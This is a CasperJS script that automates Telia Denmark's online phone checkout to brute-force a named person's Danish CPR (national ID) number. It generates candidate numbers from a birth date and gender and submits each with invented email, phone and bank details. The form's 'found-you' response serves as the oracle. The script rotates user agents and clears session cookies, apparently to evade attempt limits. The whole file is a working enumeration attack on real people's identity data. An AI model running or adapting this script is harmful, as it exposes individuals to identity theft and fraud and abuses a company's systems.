var casper = require('casper').create({
  pageSettings: {
    loadImages:  false,        // do not load images
    loadPlugins: false         // do not load NPAPI plugins (Flash, Silverlight, ...)
  },
  verbose: false
  // logLevel: "debug"
});

// command line options/arguments
var cliOptions = casper.cli.options;

var person = {
    firstName: cliOptions.firstName,
    lastName: cliOptions.lastName,
    dob: cliOptions.dob,
    gender: cliOptions.gender
};

/**************************************************/

// set different user agent for every request
var userAgents = [
  'Mozilla/5.0 (Macintosh; Intel Mac OS X)',
  'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6',
  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) ',
  'Opera/9.20 (Windows NT 6.0; U; en)',
  'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0',
  'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8'
];

// include scrapeUtils utilities
var colorizer = require('colorizer').create('Colorizer');
var generateCpr = require('./generateCpr.js').generateCpr;
var cprList = [];
var correctCpr = null;

// begin
casper.start();

casper.then(function(){
  require("utils").dump(person);

  // set random UserAgent
  var randomNumber = Math.floor(Math.random() * userAgents.length);
  casper.userAgent(userAgents[randomNumber]);

  // generate list of cpr numbers
  casper.then(function(){
    cprList = generateCpr.init(person.dob, person.gender);
    //console.log(cprList);
  });

  // clear cookies
  casper.then(function(){
    var cookies = [];
    cookies[0] = {
        'name' : 'JSESSIONID',
        'value' : ''
    };
    this.page.setCookies(cookies);
  });

  // Step 1: Open start page
  casper.then(function(){
    this.open('https://shop.telia.dk/mobil-teliadk-b2c/samsung-galaxy-s-4/psamsunggalaxysiv.html'); // Open Samsung page

    casper.then(function(){
      this.click('.buttons a.orange'); // click "Køb"
      this.captureSelector('Step 1: ' + person.firstName + ' .png', '#content');
    });
  });

  // Step 2: Click next
  casper.then(function() {
    this.click('#hwSubmitButton'); // click "Næste"
    this.captureSelector('Step 2: ' + person.firstName + ' .png', '#content');
  });

  // Step 3: choose phone number
  casper.then(function() {
    this.click('#telephoneNumbers label'); // pick a number
    this.captureSelector('Step 3: ' + person.firstName + ' .png', '#content');

    casper.then(function() {
      this.click('#submitButton'); // click "Næste"
      this.captureSelector('Step 4: ' + person.firstName + ' .png', '#content');
    });
  });

  // Step 2a (Personlige oplysninger)
  casper.then(function(){
    checkCpr(0, person);
  });
}); // endThen

// start script
if(person.firstName !== undefined && person.lastName !== undefined && person.dob !== undefined && person.gender !== undefined){
  casper.run();

// not all required info was given (name, gender, dob)
}else{
  console.log("Problem with person info:");
  require("utils").dump(person);
}

/*
 * Utility functions
 ***********************************************/

var checkCpr = function(index, person){
  var cpr = cprList[index];

  casper.then(function() {

    var email = Math.random().toString(36).substring(5) + '@gmail.com';
    var phone = Math.floor(Math.random() * 69000000) + 30000005;
    var bankReg = Math.floor(Math.random() * 9000) + 1005;
    var bankAccount = Math.floor(Math.random() * 90000000) + 10000005;

    this.captureSelector('Step 5: ' + person.firstName + ' .png', '#content');
     this.fill('form#anonymousSignInForm', {
          'firstName': person.firstName,
          'lastName': person.lastName,
          'email': email,
          'phoneNumber': phone,
          'cprNumberPart1': person.dob,
          'cprNumberPart2': cpr,
          'bankRegistrationNumber': bankReg,
          'bankAccountNumber': bankAccount
      }, false);

     // https://shop.telia.dk/adressevalidering.ep // too many attempts
     // https://shop.telia.dk/kundeoplysninger.ep?error=2 // incorrect cpr
     // https://shop.telia.dk/levering.ep SUCCESS

    casper.then(function(){
      if(this.exists('#get-address')){
        this.click('#get-address'); // click "Næste"

      // phone number has been sold. Pick a new phone number
      }else{

        this.captureSelector('not-get-address-' + cpr + '.png', '#content');
        console.log(colorizer.colorize("Kunne ikke finde #get-address", "ERROR"));

        // go to end of person list
        index = cprList.length;
      }
    });
  });

  // Step 2b: get response from Telia
  casper.then(function() {
      // successful cpr
      if(this.exists('#found-you')){
        correctCpr = person.dob + " - " + cpr;
        console.log(colorizer.colorize(person.dob + " - " + cpr, "GREEN_BAR"));

      // incorrect cpr
      }else{
        var message = this.fetchText('#failure-message-1');
        console.log(colorizer.colorize(person.dob + " - " + cpr, "ERROR") + " - " + message);

        // this.captureSelector('cpr-' + cpr + '.png', '#content');
        index++;

        if(cprList.length > index){

          // open previous page (contact info page and fill out again)
          this.open('https://shop.telia.dk/kundeoplysninger.ep');
          this.then(function(){
            checkCpr(index, person);
          });
        }else{
          console.log("Finished with " + person.firstName + " " + person.lastName);
        }
      }
  });
}; // end checkCpr()
